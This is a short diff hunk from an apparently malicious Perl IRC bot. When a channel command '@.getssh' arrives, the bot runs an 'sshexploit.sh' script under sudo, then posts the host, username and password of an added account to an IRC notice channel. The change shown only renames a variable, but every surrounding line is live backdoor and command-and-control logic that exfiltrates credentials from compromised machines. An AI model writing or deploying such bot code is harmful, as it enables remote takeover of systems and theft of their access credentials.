@@ -64,7 +64,7 @@ $irc->on(irc_privmsg => sub {
   if ($msg =~ /@.getssh/) {
   system 'sudo sh sshexploit.sh';
   system 'sudo source sshexploit.sh';
-  my $host = $ENV{'H0ST'};
+  my $h0st = $ENV{'H0ST'};
   my $us3r = $ENV{'US3R'};
   my $p4ss = $ENV{'P4SSWD'};
   $irc->write(notice => $noticechan => "9,1Added user: $us3r password: $p4ss on host:$h0st");
